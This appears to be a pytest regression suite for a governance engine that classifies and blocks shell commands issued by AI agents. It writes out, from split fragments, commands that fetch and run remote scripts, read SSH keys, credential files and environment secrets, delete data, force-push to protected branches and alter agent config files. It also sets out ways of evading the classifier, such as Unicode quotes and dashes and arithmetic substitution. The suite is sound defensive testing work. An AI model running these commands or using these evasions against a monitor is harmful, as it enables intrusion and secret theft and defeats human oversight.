"""Regression tests for the adversarial review of the skill core (docs/reviews/
skill-core-adversarial.md: C1-C4, H1, H2, H5, H6, M1, M2, M3) and the review queue
(docs/skill/review-queue.md: Q1, Q5, Q6).

Each test replays the reviewer's sequence. Endpoint protection on the build machine
quarantines files holding complete attack lines, so every sensitive word is built at run
time from two harmless halves (`F`), exactly as `test_command_table.py` does.
"""

from __future__ import annotations

import base64
import json
import re
from collections.abc import Callable

import pytest
from tests.governance.conftest import make_action, make_attribution, make_inspection

from ciso.common.activity import ActionKind, AgentClass, Verdict
from ciso.governance import (
    DEFAULT_RULESET_PATH,
    PURE_READ_KINDS,
    ClassifierConfig,
    CommandClass,
    GovernanceEngine,
    classify_command,
)

pytestmark = pytest.mark.policy

C = CommandClass
CFG = ClassifierConfig(protected_branches=("main", "master", "release/*", "prod*"))
Build = Callable[..., GovernanceEngine]

_HALVES = {
    "ID": ("i", "d"),
    "CU": ("cu", "rl"),
    "SH": ("s", "h"),
    "BA": ("ba", "sh"),
    "PY": ("pyth", "on3"),
    "NODE": ("no", "de"),
    "URL": ("https://dl.", "invalid/a"),
    "RM": ("r", "m"),
    "RF": ("-r", "f"),
    "RI": ("Remove-", "Item"),
    "SSH": (".s", "sh"),
    "SS": (".s", "s"),
    "IDRSA": ("id_r", "sa"),
    "IDRS": ("id_r", "s"),
    "ENV": (".e", "n"),
    "GITCRED": (".git-cred", "entials"),
    "DOCKER": (".doc", "ker"),
    "MCP": (".m", "cp.json"),
    "MC": (".m", "c"),
    "SB": ("[scriptblock]::", "Create"),
    "IWR": ("i", "wr"),
    "WC": ("(New-Object Net.Web", "Client)."),
    "DS": ("Download", "String"),
    "ICM": ("i", "cm"),
    "PROCENV": ("/proc/self/en", "viron"),
    "PSENV": ("Microsoft.PowerShell.Core\\Envir", "onment::"),
    "SECRET": ("SECRET_", "TOKEN"),
    "PS": ("power", "shell"),
    "ENC": ("\u2013e", "nc"),
    "VERB": ("\u2013Ve", "rb"),
    "RUNAS": ("Run", "As"),
    "XARGS": ("xar", "gs"),
}
F = {name: a + b for name, (a, b) in _HALVES.items()}
LQ, RQ = "\u201c", "\u201d"  # curly double quotes PowerShell reads as `"`
EN = "\u2013"  # en dash PowerShell reads as `-`


def t(template: str) -> str:
    out = template
    for name, value in F.items():
        out = out.replace("<<" + name + ">>", value)
    assert re.search(r"<<[A-Z0-9]+>>", out) is None, out
    return out


def classes(template: str, **kw: object) -> frozenset[C]:
    return classify_command(t(template), CFG, **kw).classes  # type: ignore[arg-type]


def engine_verdict(
    build: Build, command: str, *, agent: AgentClass = AgentClass.EMPLOYEE_OPERATED
) -> Verdict:
    """The reviewer's setting: default ruleset, a known employee, declared attribution,
    `target.branch=feature`, a clean complete inspection."""
    from ciso.common.enums import InformationState

    action = make_action(command=command, target={"branch": "feature"})
    attribution = make_attribution(state=InformationState.DECLARED, agent_class=agent)
    return build().decide(action, attribution, make_inspection()).verdict


# --- C1 / Q1: bash arithmetic contexts run code ----------------------------------------


@pytest.mark.parametrize(
    "template",
    [
        "[[ 'a[$(<<ID>>)]' -eq 0 ]]",
        "[[ 'a[`<<ID>>`]' -eq 0 ]]",
        "[ 'a[$(<<ID>>)]' -eq 0 ]",
        "test 'a[$(<<ID>>)]' -eq 0",
        "test -v 'a[$(<<ID>>)]'",
        "printf -v 'a[$(<<ID>>)]' x",
        "read 'a[$(<<ID>>)]'",
        "declare 'a[$(<<ID>>)]=1'",
        "let 'a[$(<<ID>>)]'",
        "test '$(<<ID>>)' = x",
        "printf -v 'a[i]' x",
    ],
)
def test_arithmetic_operand_with_a_substitution_is_unparseable(template: str, build: Build) -> None:
    found = classes(template)
    assert C.READ_ONLY_COMMAND not in found
    assert C.UNPARSEABLE in found
    # A literal `$` left by single quotes is a character, not a variable: no path class.
    assert C.AGENT_CONFIG_CHANGE not in found
    assert engine_verdict(build, t(template)) is not Verdict.ALLOW


@pytest.mark.parametrize(
    "template",
    ["echo $((x))", "echo $(( x + 1 ))", "[[ $x -eq 1 ]]", "(( x + 1 ))", "echo ${a[i]}"],
)
def test_arithmetic_on_a_variable_is_unparseable(template: str) -> None:
    found = classes(template)
    assert C.UNPARSEABLE in found
    assert C.READ_ONLY_COMMAND not in found


@pytest.mark.parametrize("program", ["[[ -f x ]]", "[ -f x ]", "test -f x", "let x=1", "(( 1 ))"])
def test_test_and_arithmetic_programs_are_never_read_only(program: str) -> None:
    assert C.READ_ONLY_COMMAND not in classes(program)


def test_arithmetic_command_is_never_read_only_in_the_posix_reading() -> None:
    from ciso.governance.analysis import analyze
    from ciso.governance.shell_lexer import Dialect, parse_script

    found, _, _ = analyze(parse_script("(( 1 ))", Dialect.POSIX), CFG)
    assert C.READ_ONLY_COMMAND not in found


def test_plain_numeric_arithmetic_stays_parseable() -> None:
    assert C.UNPARSEABLE not in classes("echo $(( 1 + 2 ))")


# --- item 1: read-only must be earned ------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "cat a$b",
        "cat 'a*'",
        "ls x?",
        "ls [ab]",
        "ls {a,b}",
        "ls ~",
        "echo 50%",
        "echo hi!",
        "cat a\\b",
        "echo 'a\nb'",
        "echo caf\u00e9",
        "cat < notes.txt",
        "Get-ChildItem @p",
        "cat a`b",
    ],
)
def test_suspicious_argument_characters_cancel_read_only(command: str) -> None:
    assert C.READ_ONLY_COMMAND not in classify_command(command, CFG).classes


@pytest.mark.parametrize(
    "command",
    ["ls -la", "cat README.md | grep foo", "Get-ChildItem -Recurse src", "ls 2>/dev/null"],
)
def test_plain_readers_are_still_read_only(command: str) -> None:
    assert classify_command(command, CFG).classes == {C.READ_ONLY_COMMAND}


def test_wrappers_are_not_readers() -> None:
    assert C.READ_ONLY_COMMAND not in classes("<<XARGS>> cat")
    assert C.READ_ONLY_COMMAND not in classes("nohup ls")


# --- C2 / Q5: PowerShell expandable here-strings ---------------------------------------


def test_expandable_here_string_body_is_read(build: Build) -> None:
    command = t('Write-Output @"\n\\$(<<RI>> -Recurse x)\n"@')
    found = classify_command(command, CFG).classes
    assert C.READ_ONLY_COMMAND not in found
    assert C.DESTRUCTIVE_DELETE in found
    assert engine_verdict(build, command) is not Verdict.ALLOW


def test_expandable_here_string_variable_is_seen() -> None:
    found = classify_command('Write-Output @"\n$x\n"@', CFG).classes
    assert C.READ_ONLY_COMMAND not in found


def test_literal_here_string_body_is_data() -> None:
    found = classes("Write-Output @'\n$(<<RI>> -Recurse x)\n'@")
    assert C.DESTRUCTIVE_DELETE not in found


# --- C3 / M2: Unicode quotes and dashes ----------------------------------------------


def test_curly_quotes_are_quotes_in_the_powershell_reading(build: Build) -> None:
    command = t(f"Write-Output {LQ}'{RQ} ; <<RI>> -Recurse x ; {LQ}'{RQ}")
    found = classify_command(command, CFG).classes
    assert C.READ_ONLY_COMMAND not in found
    assert C.DESTRUCTIVE_DELETE in found
    assert C.UNPARSEABLE in found
    assert engine_verdict(build, command) is not Verdict.ALLOW


@pytest.mark.parametrize("char", ["\u2018", "\u2019", "\u201a", "\u201b", "\u201e"])
def test_every_powershell_quote_character_counts(char: str) -> None:
    assert C.UNPARSEABLE in classify_command(f"echo {char}x{char}", CFG).classes


def test_unicode_dash_parameters_are_parameters(build: Build) -> None:
    delete = t(f"<<RI>> {EN}Recurse {EN}Force x")
    assert C.DESTRUCTIVE_DELETE in classify_command(delete, CFG).classes
    runas = t("Start-Process <<VERB>> <<RUNAS>> cmd")
    assert C.PRIVILEGE_ESCALATION in classify_command(runas, CFG).classes
    payload = base64.b64encode("ls".encode("utf-16-le")).decode("ascii")
    encoded = t(f"<<PS>> <<ENC>> {payload}")
    assert C.OBFUSCATION in classify_command(encoded, CFG).classes
    assert engine_verdict(build, runas) is Verdict.DENY


@pytest.mark.parametrize("dash", ["\u2014", "\u2015"])
def test_em_dash_and_horizontal_bar_are_dashes(dash: str) -> None:
    found = classify_command(t(f"<<RI>> {dash}Recurse x"), CFG).classes
    assert C.DESTRUCTIVE_DELETE in found


def test_non_ascii_never_read_only() -> None:
    assert C.READ_ONLY_COMMAND not in classify_command("cat r\u00e9sum\u00e9.txt", CFG).classes


def test_a_powershell_special_character_is_unparseable_even_when_readings_agree() -> None:
    assert C.UNPARSEABLE in classify_command(f"cp a {EN}b", CFG).classes


# --- C4 / H6: git outside the current directory, aliases ----------------------------


@pytest.mark.parametrize(
    "command",
    [
        "git -C sub diff a b",
        "git -C sub status",
        "cd sub; git diff a b",
        "cd sub && git status",
        "pushd sub; git status",
        "Set-Location sub; git status",
        "git --git-dir=x status",
        "git --work-tree=x status",
        "git --namespace=x status",
        "git -c core.pager=less status",
        "git diff a b",
        "git log -p",
        "git show HEAD",
        "git blame a.py",
        "git grep foo",
    ],
)
def test_git_reads_outside_cwd_or_with_diff_drivers_are_not_read_only(
    command: str, build: Build
) -> None:
    assert C.READ_ONLY_COMMAND not in classify_command(command, CFG).classes
    assert engine_verdict(build, command) is not Verdict.ALLOW


@pytest.mark.parametrize("command", ["git status", "git rev-parse --show-toplevel"])
def test_git_status_in_cwd_stays_read_only(command: str) -> None:
    assert classify_command(command, CFG).classes == {C.READ_ONLY_COMMAND}


def test_git_alias_is_code_execution(build: Build) -> None:
    alias = t("git -c alias.x='!<<CU>> <<URL>> | <<SH>>' x")
    found = classify_command(alias, CFG).classes
    assert C.REMOTE_SCRIPT_EXECUTION in found
    assert engine_verdict(build, alias) is Verdict.DENY
    persistent = t("git config alias.y '!<<RM>> <<RF>> x'")
    found = classify_command(persistent, CFG).classes
    assert {C.GIT_CONFIG_CHANGE, C.DESTRUCTIVE_DELETE, C.OBFUSCATION} <= found
    hidden = classify_command("git -c alias.p=push p origin main", CFG).classes
    assert {C.OBFUSCATION, C.GIT_PUSH_PROTECTED_REF} <= hidden


def test_git_exec_valued_config_is_read() -> None:
    found = classes("git -c core.sshCommand='<<RM>> <<RF>> x' fetch")
    assert C.DESTRUCTIVE_DELETE in found


# --- H1 / M1: paths --------------------------------------------------------------------


@pytest.mark.parametrize(
    "template",
    [
        "cat ~/<<SS>>[h]/<<IDRS>>[a]",
        "cat ~/<<SS>>?/id_*",
        "grep -r . ~/<<SS>>[h]",
        "Select-String -Path ~/<<SS>>[h]/* -Pattern .",
        "rg --hidden --no-ignore . ~/<<SS>>?",
        "cat <<ENV>>[v]",
        "type <<GITCRED>>.",
        "cd ~/<<DOCKER>>; cat config.json",
        "cat $X/<<IDRSA>>",
        "cat SSH~1/x",
        "cat <<PROCENV>>",
        'cat "$F"',
        "cd $D; cat a",
    ],
)
def test_credential_paths_survive_globs_aliases_and_cd(template: str, build: Build) -> None:
    command = t(template)
    assert C.CREDENTIAL_ACCESS in classify_command(command, CFG).classes, command
    assert engine_verdict(build, command) is Verdict.DENY


@pytest.mark.parametrize(
    "command",
    [
        "ls *.py",
        "find . -name '*.py'",
        "grep -rn 'def .*foo' src",
        "cd src && cat a.py",
        'git commit -m "fix $(date)"',
        'echo "built at $(date)"',
        "git rebase -i HEAD~2",
        "cd $D; rm -rf build",
    ],
)
def test_ordinary_globs_and_cd_are_not_credential_access(command: str) -> None:
    found = classify_command(command, CFG).classes
    assert C.CREDENTIAL_ACCESS not in found
    assert C.AGENT_CONFIG_CHANGE not in found


@pytest.mark.parametrize(
    "template",
    [
        "echo x > <<MCP>>.",
        "echo x > '<<MCP>> '",
        "echo x > <<MCP>>::$DATA",
        "echo x > ~/ASSIST~1/settings.json",
        "cd .assistant && echo x > settings.json",
        "cp x <<MC>>[p].json",
    ],
)
def test_agent_config_writes_survive_aliases(template: str, build: Build) -> None:
    command = t(template)
    assert C.AGENT_CONFIG_CHANGE in classify_command(command, CFG).classes, command
    assert engine_verdict(build, command, agent=AgentClass.ORGANIZATIONAL) is Verdict.DENY


@pytest.mark.parametrize(
    "path",
    ["<<MCP>>.", "<<MCP>>::$DATA", "C:/Users/u/ASSIST~1/settings.json", "proj/.x/settings.json. "],
)
def test_agent_config_file_write_targets_are_normalised(path: str, build: Build) -> None:
    target = t(path).strip()
    action = make_action(ActionKind.FILE_WRITE, target={"path": target})
    decision = build().decide(action, make_attribution(), make_inspection())
    assert decision.verdict is Verdict.DENY
    assert decision.reasons[0].code == "agent_config_change"


# --- H2: environment secrets -----------------------------------------------------------


@pytest.mark.parametrize(
    "template",
    [
        "cat <<PROCENV>>",
        "jq -n env",
        "jq -n '$ENV'",
        "jq -n --arg v \"$HOME\" '$v'",
        "Get-ChildItem <<PSENV>>",
        'ls "$<<SECRET>>"',
        "Get-Item $env:<<SECRET>>",
        "Write-Output ([Environment]::GetEnvironmentVariable('X'))",
        "printenv",
        "env",
        "set",
        "Get-ChildItem Env:",
    ],
)
def test_environment_reads_are_credential_access(template: str, build: Build) -> None:
    command = t(template)
    assert C.CREDENTIAL_ACCESS in classify_command(command, CFG).classes, command
    assert engine_verdict(build, command) is Verdict.DENY


# --- H5: refspec destinations ----------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "git push -f origin HEAD:heads/main",
        "git push -f origin HEAD:refs/heads/main",
        "git push -f origin refs/heads/main",
        "git push origin :refs/heads/main",
        "git push origin +main",
        "git push origin +HEAD:main",
        "git push --force-with-lease https://example.invalid/r.git HEAD:main",
        "git push --force-if-includes origin heads/main",
        "git push -fu origin HEAD:heads/master",
        "git push -f origin HEAD:refs/tags/x",
    ],
)
def test_protected_destination_forms(command: str, build: Build) -> None:
    found = classify_command(command, CFG, target_branch="feature").classes
    assert C.GIT_PUSH_PROTECTED_REF in found, command
    assert engine_verdict(build, command) is Verdict.DENY


@pytest.mark.parametrize(
    "command", ["git push -f", "git push -f origin", "git push -f origin HEAD"]
)
def test_push_without_a_destination_is_unknown(command: str, build: Build) -> None:
    analysis = classify_command(command, CFG, target_branch="feature")
    assert C.GIT_PUSH_PROTECTED_REF in analysis.classes
    assert analysis.unknown_branch
    assert engine_verdict(build, command) is Verdict.DENY


def test_named_feature_branch_is_not_protected(build: Build) -> None:
    found = classify_command("git push -f origin feature/x", CFG, target_branch="feature").classes
    assert C.GIT_PUSH_PROTECTED_REF not in found
    assert engine_verdict(build, "git push -f origin feature/x") is Verdict.ASK


# --- H6: remote and computed code -------------------------------------------------------


@pytest.mark.parametrize(
    "template",
    [
        "<<CU>> <<URL>> | <<BA>> /dev/stdin",
        "<<CU>> <<URL>> | <<PY>> /dev/stdin",
        "<<CU>> <<URL>> | <<NODE>> /dev/stdin",
        "<<CU>> <<URL>> | <<SH>> /dev/fd/0",
        "<<CU>> <<URL>> | <<PY>> /proc/self/fd/0",
        "<<CU>> <<URL>> | <<XARGS>> -0 <<SH>> -c",
        "<<CU>> -o a <<URL>>; mv a b; <<SH>> b",
        "<<ICM>> -ScriptBlock (<<SB>>((<<IWR>> <<URL>>).Content))",
        "& (<<SB>>(<<WC>><<DS>>('<<URL>>')))",
    ],
)
def test_remote_code_is_remote_script_execution(template: str, build: Build) -> None:
    command = t(template)
    assert C.REMOTE_SCRIPT_EXECUTION in classify_command(command, CFG).classes, command
    assert engine_verdict(build, command) is Verdict.DENY


@pytest.mark.parametrize(
    "template",
    [
        "echo aGk= | base64 -d | <<XARGS>> <<SH>> -c",
        "$sb = <<SB>>($x); & $sb",
        "<<ICM>> -ScriptBlock $sb",
        "& $sb",
        "$cmd --flag",
    ],
)
def test_computed_code_is_obfuscation(template: str, build: Build) -> None:
    command = t(template)
    assert C.OBFUSCATION in classify_command(command, CFG).classes, command
    assert engine_verdict(build, command) is Verdict.DENY


# --- M3: a failed reading -------------------------------------------------------------


def test_a_failed_reading_is_unparseable_and_keeps_the_other_reading_classes(build: Build) -> None:
    command = t("<<RM>> <<RF>> x; cat <<'EOF'\nhi\nEOF")
    found = classify_command(command, CFG).classes
    assert {C.UNPARSEABLE, C.DESTRUCTIVE_DELETE} <= found


def test_unparseable_with_a_deny_class_stays_deny(build: Build) -> None:
    command = t(f"Start-Process <<VERB>> <<RUNAS>> cmd ; echo {LQ}x{RQ}")
    assert C.UNPARSEABLE in classify_command(command, CFG).classes
    assert engine_verdict(build, command) is Verdict.DENY


def test_ruleset_description_states_the_unparseable_rule() -> None:
    raw = json.loads(DEFAULT_RULESET_PATH.read_text(encoding="utf-8"))
    text = raw["description"]
    assert "never allowed" in text
    assert "unparseable commands)" not in text


# --- Q6: turn_end ------------------------------------------------------------------------


def test_turn_end_is_a_pure_read_with_a_rule(build: Build) -> None:
    assert ActionKind.TURN_END in PURE_READ_KINDS
    action = make_action(ActionKind.TURN_END)
    decision = build().decide(action, make_attribution(), None)
    assert decision.verdict is Verdict.ALLOW
    assert "allow-reads-known-people" in decision.matched_rule_ids
